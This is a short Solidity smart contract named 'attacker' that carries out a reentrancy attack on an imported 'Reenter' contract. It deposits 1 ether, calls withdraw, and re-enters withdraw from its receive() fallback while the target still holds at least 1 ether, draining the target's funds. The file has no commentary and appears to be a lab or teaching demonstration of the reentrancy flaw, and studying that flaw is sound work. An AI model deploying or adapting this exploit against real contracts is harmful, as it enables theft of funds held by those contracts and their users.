//SPDX-License-Identifier:MIT
pragma solidity ^0.8.8;

import "./Reenter.sol";

contract attacker{

    Reenter public re;

    constructor(address applicationAddress){
        re = Reenter(applicationAddress);
    }

    function attack() external payable returns(bool)
    {
        re.deposit{value:1 ether}();
        re.withdraw();
        return true;
    }

    receive() external payable{
    if(address(re).balance>=1 ether)
        {
            re.withdraw();
        }

    }

}